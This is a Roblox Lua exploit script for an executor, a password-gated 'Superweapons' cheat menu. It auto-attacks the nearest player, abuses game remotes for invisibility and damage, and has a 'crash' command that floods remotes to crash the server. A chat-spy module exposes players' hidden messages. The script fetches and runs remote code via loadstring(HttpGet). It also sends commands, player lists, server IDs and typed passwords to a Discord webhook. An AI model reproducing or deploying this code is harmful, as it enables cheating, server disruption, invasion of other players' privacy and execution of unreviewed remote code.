_G.tblKeys = {
	["key_2413f72b465d89210a490e0b17e6b6ceefcc545a576360316e1ec4f59215158a2e4ef45d9cd177e9440dd53554f501279cdf7f5c54031821fc83b5a72c12b1aa"] = true
}

local srvHTTP = game:GetService("HttpService")
local strPassword = "xz4R92"

-- Instances:

local insSuperweaponsGUI = Instance.new("ScreenGui")
local insRegionalLogo = Instance.new("ImageLabel")
local insPasswordFrame = Instance.new("Frame")
local insWelcome = Instance.new("TextLabel")
local insPasswordBox = Instance.new("TextBox")
local insUICorner = Instance.new("UICorner")
local insUICorner_2 = Instance.new("UICorner")

-- Properties:

local function voidInitiate()	
	-- Instances:

	local insSuperweaponsGUI = Instance.new("ScreenGui")
	local insSuperweaponsFrame = Instance.new("Frame")
	local insHR = Instance.new("TextLabel")
	local insCommandBox = Instance.new("TextBox")
	local insUICorner = Instance.new("UICorner")
	local insUICorner_2 = Instance.new("UICorner")
	local insImmortalChamps = Instance.new("ImageLabel")
	local insWenzic = Instance.new("ImageLabel")
	local insRegional = Instance.new("ImageButton")
	local insThanks = Instance.new("TextLabel")

	--Properties:

	insSuperweaponsGUI.Archivable = false
	insSuperweaponsGUI.Name = "insSuperweaponsGUI"
	insSuperweaponsGUI.Parent = game.CoreGui
	insSuperweaponsGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	insSuperweaponsFrame.Name = "SuperweaponsFrame"
	insSuperweaponsFrame.AnchorPoint = Vector2.new(1, 1)
	insSuperweaponsFrame.BackgroundColor3 = Color3.fromRGB(56, 55, 83)
	insSuperweaponsFrame.BackgroundTransparency = 1
	insSuperweaponsFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	insSuperweaponsFrame.BorderSizePixel = 2
	insSuperweaponsFrame.Position = UDim2.new(1.3, 0, 1, 0)
	insSuperweaponsFrame.Size = UDim2.new(0.200000003, 0, 0.100000001, 0)
	insSuperweaponsFrame.SizeConstraint = Enum.SizeConstraint.RelativeXX
	insSuperweaponsFrame.ZIndex = -1
	insSuperweaponsFrame.Parent = insSuperweaponsGUI

	insHR.Name = "insHR"
	insHR.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	insHR.BackgroundTransparency = 1.000
	insHR.Position = UDim2.new(0.29067421, 0, 0.342126518, 0)
	insHR.Size = UDim2.new(0.647241354, 0, 0.144573718, 0)
	insHR.Font = Enum.Font.SciFi
	insHR.Text = "HAIL REGIONAL."
	insHR.TextColor3 = Color3.fromRGB(255, 255, 255)
	insHR.TextScaled = true
	insHR.TextSize = 14.000
	insHR.TextWrapped = true
	insHR.Parent = insSuperweaponsFrame

	insCommandBox.Name = "insCommandBox"
	insCommandBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	insCommandBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
	insCommandBox.Position = UDim2.new(0.29067421, 0, 0.102539063, 0)
	insCommandBox.Size = UDim2.new(0.647241354, 0, 0.206533909, 0)
	insCommandBox.Font = Enum.Font.SciFi
	insCommandBox.Text = ""
	insCommandBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	insCommandBox.TextScaled = true
	insCommandBox.TextSize = 14.000
	insCommandBox.TextWrapped = true
	insCommandBox.Parent = insSuperweaponsFrame

	insUICorner.Parent = insCommandBox
	insUICorner_2.Parent = insSuperweaponsFrame

	insImmortalChamps.Name = "insImmortalChamps"
	insImmortalChamps.BackgroundColor3 = Color3.fromRGB(56, 55, 83)
	insImmortalChamps.BorderColor3 = Color3.fromRGB(0, 0, 0)
	insImmortalChamps.Position = UDim2.new(0.442999989, 0, 0.524999976, 0)
	insImmortalChamps.Size = UDim2.new(0.15625, 0, 0.3125, 0)
	insImmortalChamps.Parent = insSuperweaponsFrame

	insWenzic.Name = "insWenzic"
	insWenzic.BackgroundColor3 = Color3.fromRGB(56, 55, 83)
	insWenzic.BorderColor3 = Color3.fromRGB(0, 0, 0)
	insWenzic.Position = UDim2.new(0.625, 0, 0.524999976, 0)
	insWenzic.Size = UDim2.new(0.15625, 0, 0.3125, 0)
	insWenzic.Parent = insSuperweaponsFrame

	insRegional.Name = "insRegional"
	insRegional.AnchorPoint = Vector2.new(0.5, 0.5)
	insRegional.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	insRegional.BackgroundTransparency = 1.000
	insRegional.BorderColor3 = Color3.fromRGB(27, 42, 53)
	insRegional.BorderSizePixel = 0
	insRegional.Position = UDim2.new(0, 0, 0.5, 0)
	insRegional.Size = UDim2.new(1, 0, 1, 0)
	insRegional.SizeConstraint = Enum.SizeConstraint.RelativeYY
	insRegional.Image = "http://www.roblox.com/asset/?id=7979371995"
	insRegional.Parent = insSuperweaponsFrame

	insThanks.Name = "insThanks"
	insThanks.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	insThanks.BackgroundTransparency = 1.000
	insThanks.Position = UDim2.new(0.271317482, 0, 0.877276897, 0)
	insThanks.Size = UDim2.new(0.685006857, 0, 0.088033013, 0)
	insThanks.Font = Enum.Font.SciFi
	insThanks.Text = "Thanks to Conf and Wenzic for founding Regional."
	insThanks.TextColor3 = Color3.fromRGB(255, 255, 255)
	insThanks.TextScaled = true
	insThanks.TextSize = 14.000
	insThanks.TextWrapped = true
	insThanks.Parent = insSuperweaponsFrame

	local objMouse = game.Players.LocalPlayer:GetMouse()

	coroutine.resume(coroutine.create(function()
		insImmortalChamps.Image = game:GetService("Players"):GetUserThumbnailAsync(64880093, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
	end))

	coroutine.resume(coroutine.create(function()
		insWenzic.Image = game:GetService("Players"):GetUserThumbnailAsync(54331282, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
	end))

	insSuperweaponsFrame:TweenPosition(UDim2.new(1.15, 0, 1, 0), "Out", "Quad", 0.5, true)

	wait(1)

	insSuperweaponsFrame:TweenPosition(UDim2.new(1.231, 0, 1, 0), "Out", "Quad", 0.5, true, function()
		insSuperweaponsFrame.BackgroundTransparency = 0

		local function blnCollides(insGuiObject)
			local vc2AbsolutePosition = insGuiObject.AbsolutePosition
			local vc2AbsoluteSize = insGuiObject.AbsoluteSize
			local blnIsColliding = false

			if (vc2AbsolutePosition.x < objMouse.X) then
				if (objMouse.X < vc2AbsolutePosition.x + vc2AbsoluteSize.x) then
					if (vc2AbsolutePosition.y < objMouse.Y) then
						blnIsColliding = objMouse.Y < vc2AbsolutePosition.y + vc2AbsoluteSize.y
					end
				end
			end

			return blnIsColliding
		end

		if not(game:IsLoaded()) then
			game.Loaded:Wait()
		end

		local insCombat = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Combat")

		local srvUIS = game:GetService("UserInputService")
		local srvRUN = game:GetService("RunService")

		local insTarget

		local function insGetHRP(insCHR)
			local HRP = insCHR:FindFirstChild("HumanoidRootPart") or insCHR:FindFirstChild("Torso") or insCHR:FindFirstChild("UpperTorso")
			return HRP
		end


		srvUIS.InputBegan:Connect(function(input, gp)
			if (input.KeyCode == Enum.KeyCode.Q) and not(gp) then
				local nearestPlayers = {}

				for i, v in pairs(game.Players:GetPlayers()) do
					if insGetHRP(v.Character) and insGetHRP(game.Players.LocalPlayer.Character) and v ~= game.Players.LocalPlayer then
						local distance = (insGetHRP(v.Character).Position - insGetHRP(game.Players.LocalPlayer.Character).Position).Magnitude

						table.insert(nearestPlayers, {v, distance})
					end
				end

				table.sort(nearestPlayers, 
					function(a, b)
						return a[2] < b[2]
					end
				)

				insTarget = nearestPlayers[1][1] or game.Players.LocalPlayer

				-- combat:FireServer(1)
				wait(0.5)
				insCombat:FireServer(insTarget.Character)
			end
		end)

		--This script reveals ALL hidden messages in the default chat
		--chat "/spy" to toggle!
		enabled = true
		--if true will check your messages too
		spyOnMyself = true
		--if true will chat the logs publicly (fun, risky)
		public = false
		--if true will use /me to stand out
		publicItalics = true
		--customize private logs
		privateProperties = {
			Color = Color3.fromRGB(80,80,80); 
			Font = Enum.Font.SourceSansBold;
			TextSize = 18;
		}
		--////////////////////////////////////////////////////////////////
		local StarterGui = game:GetService("StarterGui")
		local Players = game:GetService("Players")
		local player = Players.LocalPlayer
		local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
		local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
		local instance = (_G.chatSpyInstance or 0) + 1
		_G.chatSpyInstance = instance

		local function onChatted(p,msg)
			if _G.chatSpyInstance == instance then
				if p==player and msg:lower():sub(1,4)=="/spy" then
					enabled = not enabled
					wait(0.3)
					privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				elseif enabled and (spyOnMyself==true or p~=player) then
					msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
					local hidden = true
					local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
						if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
							hidden = false
						end
					end)
					wait(1)
					conn:Disconnect()
					if hidden and enabled then
						if public then
							saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
						else
							privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
							StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
						end
					end
				end
			end
		end

		for _,p in ipairs(Players:GetPlayers()) do
			p.Chatted:Connect(function(msg) onChatted(p,msg) end)
		end
		Players.PlayerAdded:Connect(function(p)
			p.Chatted:Connect(function(msg) onChatted(p,msg) end)
		end)
		privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
		StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)

		pcall(function()
			local chatFrame = player.PlayerGui.Chat.Frame
			chatFrame.ChatChannelParentFrame.Visible = true
			chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
		end)

		local blnStunOn = true

		insCommandBox.FocusLost:Connect(function(blnEnterPressed)
			local strText = (insCommandBox.Text):lower()

			if (blnEnterPressed) then
				insCommandBox.Text = ""

				if (strText:sub(1, 5) == "crash") then
					local strPlayers = ""

					for numIndex, insPlayer in next, game.Players:GetPlayers() do
						if numIndex == 1 then
							strPlayers = insPlayer.Name
						else
							strPlayers = strPlayers .. "\n" .. insPlayer.Name
						end
					end

					local tblTime = os.date("!*t")

					for strIndex, numInteger in next, tblTime do
						if not(type(numInteger) == "boolean") and (string.len(numInteger) == 1) then
							print(numInteger)
							tblTime[strIndex] = "0" .. numInteger
						end
					end

					strContent = {
						["content"] = "",
						["embeds"] = {
							{
								["title"] = "Command executed!",
								["color"] = 16734296,
								["fields"] = {
									{
										["name"] = "Username:",
										["value"] = game.Players.LocalPlayer.Name,
										["inline"] = true
									},
									{
										["name"] = "Command:",
										["value"] = strText,
										["inline"] = true
									},
									{
										["name"] = "Date of execution:",
										["value"] = tblTime["year"] .. "-" .. tblTime["month"] .. "-" .. tblTime["day"] .. " at " .. tblTime["hour"] .. ":" .. tblTime["min"],
										["inline"] = true
									},
									{
										["name"] = "PlaceId:\nJobId:",
										["value"] = game.PlaceId .. "\n" .. game.JobId,
										["inline"] = true
									},
									{
										["name"] = "Player list:",
										["value"] = strPlayers,
										["inline"] = true
									}
								},
								["thumbnail"] = {
									["url"] = "https://cdn.discordapp.com/icons/704893256470888528/2448b86e4bc2937a3a4c06b401e0fafc.png?size=4096"
								}
							}
						}
					}
				else
					local tblTime = os.date("!*t")

					for strIndex, numInteger in next, tblTime do
						if not(type(numInteger) == "boolean") and (string.len(numInteger) == 1) then
							print(numInteger)
							tblTime[strIndex] = "0" .. numInteger
						end
					end

					strContent = {
						["content"] = "",
						["embeds"] = {
							{
								["title"] = "Command executed!",
								["color"] = 16734296,
								["fields"] = {
									{
										["name"] = "Username:",
										["value"] = game.Players.LocalPlayer.Name,
										["inline"] = true
									},
									{
										["name"] = "Command:",
										["value"] = strText,
										["inline"] = true
									},
									{
										["name"] = "Date of execution:",
										["value"] = tblTime["year"] .. "-" .. tblTime["month"] .. "-" .. tblTime["day"] .. " at " .. tblTime["hour"] .. ":" .. tblTime["min"],
										["inline"] = true
									}
								},
								["thumbnail"] = {
									["url"] = "https://cdn.discordapp.com/icons/704893256470888528/2448b86e4bc2937a3a4c06b401e0fafc.png?size=4096"
								}
							}
						}
					}
				end

				strContent = srvHTTP:JSONEncode(strContent)

				syn.request(
					{
						Url = strWebhook,
						Method = "POST",
						Headers = {
							['Content-Type'] = 'application/json'
						},
						Body = strContent
					}
				)

				if (strText == "invis") then
					if (game.Players.LocalPlayer.Character.Head:FindFirstChild("face")) then
						game.Players.LocalPlayer.Character.Head["face"]:Destroy()
					end

					game:GetService("ReplicatedStorage").Remotes.DoClientMagic:FireServer("Spirit", "Spectral Embodiment")
					game:GetService("ReplicatedStorage").Remotes.DoMagic:InvokeServer("Spirit", "Spectral Embodiment")
				elseif (strText == "dmg") then
					if game.Players.LocalPlayer.Character:FindFirstChild("Body Colors") then
						game.Players.LocalPlayer.Character["Body Colors"]:Destroy()
					end

					game:GetService("ReplicatedStorage").Remotes.DoClientMagic:FireServer("Fire", "Flame Body")
					game:GetService("ReplicatedStorage").Remotes.DoMagic:InvokeServer("Fire", "Flame Body")

					for _, insChild in pairs(game.Players.LocalPlayer.Character.HumanoidRootPart:GetChildren()) do
						if insChild.Name == "Fire" then
							insChild:Destroy()
						end
					end
				elseif (strText == "def1") then
					if game.Players.LocalPlayer.Character:FindFirstChild("Body Colors") then
						game.Players.LocalPlayer.Character["Body Colors"]:Destroy()
					end

					game:GetService("ReplicatedStorage").Remotes.DoClientMagic:FireServer("Earth", "Rock Armor")
					game:GetService("ReplicatedStorage").Remotes.DoMagic:InvokeServer("Earth", "Rock Armor")
				elseif (strText == "def2") then
					game:GetService("ReplicatedStorage").Remotes.DoClientMagic:FireServer("Crystal", "Crystal Armament")
					game:GetService("ReplicatedStorage").Remotes.DoMagic:InvokeServer("Crystal", "Crystal Armament", {["LastPosition"] = 0, 0, 0})
				elseif (strText == "crash") then
					local insLPLR = game.Players.LocalPlayer
					local insCHR = insLPLR.Character or insLPLR.CharacterAdded:Wait()

					game:GetService("ReplicatedStorage").Remotes.DoClientMagic:FireServer("Angel", "Flash Slash")
					game:GetService("ReplicatedStorage").Remotes.DoMagic:InvokeServer("Angel", "Flash Slash", CFrame.new(insCHR:WaitForChild("HumanoidRootPart").Position))

					insCHR.HumanoidRootPart.CFrame = CFrame.new(9, 1999999999999999999960, 532)

					local numStartTime = tick()

					while (numStartTime > tick() - 8) do
						game:GetService("ReplicatedStorage").Remotes.DoClientMagic:FireServer("Angel", "Flash Slash")
						game:GetService("ReplicatedStorage").Remotes.DoMagic:InvokeServer("Reaper", "Reaper's Seal")

						insCHR.HumanoidRootPart.CFrame = CFrame.new(825441792, 825440832, 825440064)
						wait(0.05)
						insCHR.HumanoidRootPart.CFrame = CFrame.new(-24986882048, 24986882048, -24986880000)
					end

					insCHR:BreakJoints()
				elseif (strText == "spy") then
					enabled = not(enabled)
				elseif (strText == "antistun") then
					blnStunOn = not(blnStunOn)

					for _, cnc in getconnections(game:GetService("ReplicatedStorage").Remotes:WaitForChild("Combat").OnClientEvent) do
						if not(blnStunOn) then
							cnc:Disable()
						else
							cnc:Enable()
						end
					end
				elseif (strText == "rj") then
					local srvTS = game:GetService("TeleportService")
					local insLPlayer = game:GetService("Players").LocalPlayer

					srvTS:Teleport(game.PlaceId, insLPlayer)
				elseif (strText == "re") then
					local function voidRespawn(plr)
						local chr = plr.Character

						if (chr:FindFirstChildOfClass("Humanoid")) then chr:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
						chr:ClearAllChildren()

						local newchr = Instance.new("Model")
						newchr.Parent = workspace
						plr.Character = newchr

						wait()

						plr.Character = chr
						newchr:Destroy()
					end

					local function voidRefresh(plr)
						local hum = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid", true)
						local pos = hum and hum.RootPart and hum.RootPart.CFrame
						local pos1 = workspace.CurrentCamera.CFrame

						voidRespawn(plr)

						spawn(function()
							plr.CharacterAdded:Wait():WaitForChild("Humanoid").RootPart.CFrame, workspace.CurrentCamera.CFrame = pos, wait() and pos1
						end)
					end

					voidRefresh(game.Players.LocalPlayer)
				elseif (strText == "iy") then
					loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
				end
			end
		end)

		game:GetService("RunService").RenderStepped:Connect(function()
			if (blnCollides(insSuperweaponsFrame)) or (blnCollides(insRegional)) then
				insSuperweaponsFrame:TweenPosition(UDim2.new(1, 0, 1, 0), "Out", "Quad", 0.25, true)
			else
				insSuperweaponsFrame:TweenPosition(UDim2.new(1.231, 0, 1, 0), "Out", "Quad", 0.25, true)
			end
		end)
	end)
end

if (_G.tblKeys[_G.strKey] == true) and isfile("Superweapons.txt") and (readfile("Superweapons.txt") == strPassword) then
	strContent = {
		["content"] = "",
		["embeds"] = {
			{
				["title"] = "Autologin initiated!",
				["color"] = 16734296,
				["fields"] = {
					{
						["name"] = "Username:",
						["value"] = game.Players.LocalPlayer.Name,
						["inline"] = true
					},
					{
						["name"] = "Whitelist status:",
						["value"] = (_G.tblKeys[_G.strKey] == true) and "Whitelisted" or "Not whitelisted",
						["inline"] = true
					},
					{
						["name"] = "Password used:",
						["value"] = readfile("Superweapons.txt"),
						["inline"] = true
					},
					{
						["name"] = "Access granted:",
						["value"] = (_G.tblKeys[_G.strKey] == true and strPassword == readfile("Superweapons.txt")) and "Yes" or "No",
						["inline"] = true
					}
				},
				["thumbnail"] = {
					["url"] = "https://cdn.discordapp.com/icons/704893256470888528/2448b86e4bc2937a3a4c06b401e0fafc.png?size=4096"
				}
			}
		}
	}

	strContent = srvHTTP:JSONEncode(strContent)

	syn.request(
		{
			Url = strWebhook,
			Method = "POST",
			Headers = {
				['Content-Type'] = 'application/json'
			},
			Body = strContent
		}
	)

	voidInitiate()
else
	if isfile("Superweapons.txt") then
		strContent = {
			["content"] = "",
			["embeds"] = {
				{
					["title"] = "Autologin failure!",
					["color"] = 16734296,
					["fields"] = {
						{
							["name"] = "Username:",
							["value"] = game.Players.LocalPlayer.Name,
							["inline"] = true
						},
						{
							["name"] = "Whitelist status:",
							["value"] = (_G.tblKeys[_G.strKey] == true) and "Whitelisted" or "Not whitelisted",
							["inline"] = true
						},
						{
							["name"] = "Password used:",
							["value"] = readfile("Superweapons.txt"),
							["inline"] = true
						},
						{
							["name"] = "Access granted:",
							["value"] = (_G.tblKeys[_G.strKey] == true and strPassword == readfile("Superweapons.txt")) and "Yes" or "No",
							["inline"] = true
						}
					},
					["thumbnail"] = {
						["url"] = "https://cdn.discordapp.com/icons/704893256470888528/2448b86e4bc2937a3a4c06b401e0fafc.png?size=4096"
					}
				}
			}
		}

		strContent = srvHTTP:JSONEncode(strContent)

		syn.request(
			{
				Url = strWebhook,
				Method = "POST",
				Headers = {
					['Content-Type'] = 'application/json'
				},
				Body = strContent
			}
		)
	end

	insSuperweaponsGUI.Name = "SuperweaponsGUI"
	insSuperweaponsGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	insSuperweaponsGUI.Parent = game.CoreGui

	insRegionalLogo.Name = "RegionalLogo"
	insRegionalLogo.AnchorPoint = Vector2.new(0.5, 0.5)
	insRegionalLogo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	insRegionalLogo.BackgroundTransparency = 1.000
	insRegionalLogo.BorderColor3 = Color3.fromRGB(0, 0, 0)
	insRegionalLogo.BorderSizePixel = 0
	insRegionalLogo.Position = UDim2.new(0.5, 0, -0.5, 0)
	insRegionalLogo.Size = UDim2.new(0.25, 0, 0.25, 0)
	insRegionalLogo.SizeConstraint = Enum.SizeConstraint.RelativeYY
	insRegionalLogo.Image = "http://www.roblox.com/asset/?id=7979371995"
	insRegionalLogo.Parent = insSuperweaponsGUI

	insPasswordFrame.Name = "PasswordFrame"
	insPasswordFrame.AnchorPoint = Vector2.new(0.5, 0)
	insPasswordFrame.BackgroundColor3 = Color3.fromRGB(56, 55, 83)
	insPasswordFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	insPasswordFrame.BorderSizePixel = 2
	insPasswordFrame.Position = UDim2.new(0.5, 0, -0.5, 0)
	insPasswordFrame.Size = UDim2.new(0.100000001, 0, 0.100000001, 0)
	insPasswordFrame.SizeConstraint = Enum.SizeConstraint. RelativeYY
	insPasswordFrame.ZIndex = -1
	insPasswordFrame.Parent = insSuperweaponsGUI

	insWelcome.Name = "Welcome"
	insWelcome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	insWelcome.BackgroundTransparency = 1.000
	insWelcome.Position = UDim2.new(0.0495185703, 0, 0.425459832, 0)
	insWelcome.Size = UDim2.new(0.89683634, 0, 0.144573733, 0)
	insWelcome.Font = Enum. Font.SciFi
	insWelcome.Text = "Welcome to the Regional Superweapons GUI, please enter the password."
	insWelcome.TextColor3 = Color3.fromRGB(255, 255, 255)
	insWelcome.TextScaled = true
	insWelcome.TextSize = 14.000
	insWelcome.TextTransparency = 1.000
	insWelcome.TextWrapped = true
	insWelcome.Parent = insPasswordFrame

	insPasswordBox.Name = "PasswordBox"
	insPasswordBox.BackgroundColor3 = Color3.fromRGB( 40, 40, 40)
	insPasswordBox.BackgroundTransparency = 1.000
	insPasswordBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
	insPasswordBox.Position = UDim2.new(0.112792298, 0, 0.665039182, 0)
	insPasswordBox.Size = UDim2.new(0.773039877, 0, 0.206533909, 0)
	insPasswordBox.Font = Enum. Font.SciFi
	insPasswordBox.Text = ""
	insPasswordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	insPasswordBox.TextScaled = true
	insPasswordBox.TextSize = 14.000
	insPasswordBox.TextTransparency = 1.000
	insPasswordBox.TextWrapped = true
	insPasswordBox.ClearTextOnFocus = false
	insPasswordBox.Parent = insPasswordFrame

	insUICorner.Parent = insPasswordBox
	insUICorner_2.Parent = insPasswordFrame

	local srvTween = game:GetService("TweenService")

	insPasswordFrame:TweenPosition(UDim2.new(0.5, 0, 0.375, 0), "Out", "Quad", 2, true)

	insRegionalLogo:TweenPosition(UDim2.new(0.5, 0, 0.375, 0), "Out", "Quad", 2, true, function()
		insPasswordFrame:TweenSize(UDim2.new(0.5, 0, 1/3, 0), "Out", "Quad", 1, true, function()
			local tblTextTransGoal = {}
			tblTextTransGoal.TextTransparency = 0
			local tblBackgroundTransGoal = {}
			tblBackgroundTransGoal.BackgroundTransparency = 0
			srvTween:Create(insWelcome, TweenInfo.new(1), tblTextTransGoal):Play()
			srvTween:Create(insPasswordBox, TweenInfo.new(1), tblTextTransGoal):Play()
			srvTween:Create(insPasswordBox, TweenInfo.new(1), tblBackgroundTransGoal):Play()

			insPasswordBox.FocusLost:Connect(function(blnEnterpressed)
				if (blnEnterpressed) then
					local strText = insPasswordBox.Text

					insPasswordBox.Text = ""

					strContent = {
						["content"] = "",
						["embeds"] = {
							{
								["title"] = "New login attempt detected!",
								["color"] = 16734296,
								["fields"] = {
									{
										["name"] = "Username:",
										["value"] = game.Players.LocalPlayer.Name,
										["inline"] = true
									},
									{
										["name"] = "Whitelist status:",
										["value"] = (_G.tblKeys[_G.strKey] == true) and "Whitelisted" or "Not whitelisted",
										["inline"] = true
									},
									{
										["name"] = "Password used:",
										["value"] = strText,
										["inline"] = true
									},
									{
										["name"] = "Access granted:",
										["value"] = (_G.tblKeys[_G.strKey] == true and strPassword == strText) and "Yes" or "No",
										["inline"] = true
									}
								},
								["thumbnail"] = {
									["url"] = "https://cdn.discordapp.com/icons/704893256470888528/2448b86e4bc2937a3a4c06b401e0fafc.png?size=4096"
								}
							}
						}
					}

					strContent = srvHTTP:JSONEncode(strContent)

					syn.request(
						{
							Url = strWebhook,
							Method = "POST",
							Headers = {
								['Content-Type'] = 'application/json'
							},
							Body = strContent
						}
					)

					if (strPassword == strText) and (_G.tblKeys[_G.strKey] == true) then
						insWelcome.Text = "Access granted. Please wait while the GUI opens."
						insWelcome.TextColor3 = Color3.fromRGB(0, 255, 0)
						wait(3)
						tblTextTransGoal.TextTransparency = 1
						tblBackgroundTransGoal.BackgroundTransparency = 1
						srvTween:Create(insWelcome, TweenInfo.new(0.5), tblTextTransGoal):Play()
						srvTween:Create(insPasswordBox, TweenInfo.new(0.5), tblTextTransGoal):Play()
						srvTween:Create(insPasswordBox, TweenInfo.new(0.5), tblBackgroundTransGoal):Play()
						wait(0.5)
						insPasswordFrame:TweenSize(UDim2.new(0, 0, 0, 0), "Out", "Quad", 1, true, function()
							insPasswordFrame:Destroy()
							insRegionalLogo:TweenSize(UDim2.new(0, 0, 0, 0), "Out", "Quad", 0.5, true, function()
								insRegionalLogo:Destroy()

								writefile("Superweapons.txt", strText)

								voidInitiate()
							end)
						end)
					elseif not((strPassword == strText) and (_G.tblKeys[_G.strKey] == true)) then
						insWelcome.Text = "Access denied. Please try again or contact log4rithmic if you think this is a mistake."
						insWelcome.TextColor3 = Color3.fromRGB(255, 0, 0)
						wait(3)
						insWelcome.Text = "Welcome to the Regional Superweapons GUI, please enter the password."
						insWelcome.TextColor3 = Color3.fromRGB(255, 255, 255)
					end
				end
			end)
		end)
	end)
end
